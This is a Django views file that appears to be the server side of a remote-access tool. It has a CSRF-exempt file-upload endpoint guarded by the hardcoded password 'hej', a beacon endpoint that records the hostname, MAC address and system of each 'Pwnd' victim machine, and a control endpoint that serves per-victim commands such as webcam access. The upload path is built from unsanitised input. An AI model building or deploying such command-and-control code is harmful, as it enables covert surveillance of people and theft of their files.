
from django.shortcuts import HttpResponse, render
from django.views.decorators.csrf import csrf_exempt
import os
import base64
from datetime import datetime
from .models import Pwnd

# Create your views here.
@csrf_exempt
def upload(request):
    if request.method == "POST":
        if request.POST["password"] == "hej":
            if not os.path.exists(f"users\\{request.POST['user']}"):
                os.mkdir(f"users\\{request.POST['user']}")
            with open(f"users\\{request.POST['user']}\\{str(request.FILES['file'])}", "wb") as file:
                file.write(request.FILES["file"].file.getbuffer())
    return HttpResponse(request)

def alive_service(request):
    if request.method == "GET":
        if request.GET["password"] == "hej":
            hostname = request.GET["hostname"]
            mac_address = request.GET["mac_address"]
            print(Pwnd.objects.all())
            if not Pwnd.objects.filter(id = base64.b16encode(hostname.encode()).decode("utf-8") + base64.b16encode(mac_address.encode()).decode("utf-8")):
                Pwnd.objects.create(id = base64.b16encode(hostname.encode()).decode("utf-8") + base64.b16encode(mac_address.encode()).decode("utf-8"), hostname = request.GET["hostname"], mac_address = request.GET["mac_address"], system = request.GET["system"] )
            else:
                pwnd = Pwnd.objects.get(id = base64.b16encode(hostname.encode()).decode("utf-8") + base64.b16encode(mac_address.encode()).decode("utf-8"))
                pwnd.latest_connection=datetime.now()
                pwnd.save()
    return HttpResponse(request)

def control(request):
    if not request.GET["password"] == "hej":
        return 0
    hostname = request.GET["hostname"]
    mac_address = request.GET["mac_address"]
    pwnd = Pwnd.objects.get(id = base64.b16encode(hostname.encode()).decode("utf-8") + base64.b16encode(mac_address.encode()).decode("utf-8"))

    context = {
        "webcam": pwnd.webcam

    }
    return render(request, "control.json", context)